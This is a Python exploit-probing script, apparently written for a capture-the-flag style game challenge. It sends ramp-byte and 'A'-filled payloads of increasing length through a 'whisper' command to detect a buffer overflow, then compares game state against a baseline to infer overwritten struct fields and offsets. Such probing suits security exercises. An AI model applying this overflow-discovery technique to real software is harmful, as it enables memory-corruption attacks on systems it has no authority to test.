#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
H1/H4 盲打: mw whisper 越界写 / 结构体字段覆盖 scanner

思路:
  whisper 把 hex 字节写进"已装备物品"的某个字符串字段(名字或描述)。
  字符串在结构体里很可能是定长内联数组, 后面紧跟 type/equipped/price 甚至
  hero 的 Rupees/HP/BossHP。只要没有长度校验, 就能纯文本观测到字段被改。

  每个长度单开一个连接(崩溃只损失一条连接), 写"斜坡字节" payload:
    byte[i] = i & 0xff
  这样被覆盖的 4 字节字段打印成十进制后, 可以反推它落在哪个偏移。

用法:
  python3 exp_whisper.py ramp         # 斜坡 payload 扫长度
  python3 exp_whisper.py flat 64      # 0x41 填充指定长度
  python3 exp_whisper.py scan         # 长度二分 + 邻接 item 观测
"""
import sys, re, game

SEP = "=" * 78

LENGS = [4, 8, 12, 16, 24, 28, 32, 36, 40, 44, 48, 56, 64, 72, 80,
         96, 128, 160, 192, 256, 384, 512, 768, 1024]


def rupees(t):
    m = re.search(r"Rupees=(-?\d+)", t)
    return m.group(1) if m else "?"


def line_state(t):
    for pat in (r"\[\*\] HP=.*", r"\[\*\] Equipped:.*", r"\[\*\] Drops:.*"):
        m = re.search(pat, t)
        if m:
            yield m.group(0)


def run(payload_hex, pre=("inv equip 0",), post=("inv list", "mw show", "shop list")):
    g = game.Game()
    log = []
    for c in pre:
        log.append((c, g.cmd(c)))
    cmd = f"mw whisper 0 {payload_hex}"
    log.append((cmd, g.cmd(cmd)))
    for c in post:
        log.append((c, g.cmd(c)))
    g.close()
    return log


def show(tag, log, base=None):
    print(SEP)
    print(f"### {tag}")
    crashed = all(not o.strip() for c, o in log[-2:])
    for c, o in log:
        o = o.rstrip()
        mark = ""
        if base and c in base:
            b = base[c].rstrip()
            if b != o:
                mark = "   <== DIFF"
        print(f">>> {c}")
        print(o if o else "<empty>")
        if mark:
            print(mark)
    print(f"[crashed?] {crashed}")


def baseline():
    g = game.Game()
    b = {}
    for c in ("inv equip 0", "inv list", "mw show", "shop list"):
        b[c] = g.cmd(c)
    g.close()
    return b


def ramp():
    base = baseline()
    print("[base]")
    for c, o in base.items():
        print(f">>> {c}\n{o.rstrip()}")
    for L in LENGS:
        payload = "".join(f"{i & 0xff:02x}" for i in range(L))
        log = run(payload)
        show(f"ramp len={L}", log, base)
        print(f"[rupees before/after] {rupees(base['mw show'])} -> "
              f"{rupees(log[-1][1] if log else '')}")


def scan():
    """长度递增 + 先放一个"邻居 item"用来观测跨 chunk/跨结构体溢出"""
    for L in LENGS:
        payload = "41" * L
        # 买 1 个 Bomb Flower 作为邻居对象, 便于对比谁被踩
        log = run(payload, pre=("inv equip 0", "shop buy 3 1"))
        show(f"flat 0x41 len={L} (neighbor bomb bought)", log)


def flat(L):
    L = int(L)
    log = run("41" * L)
    show(f"flat len={L}", log)


if __name__ == "__main__":
    a = sys.argv[1] if len(sys.argv) > 1 else "scan"
    if a == "ramp":
        ramp()
    elif a == "flat":
        flat(sys.argv[2])
    else:
        scan()
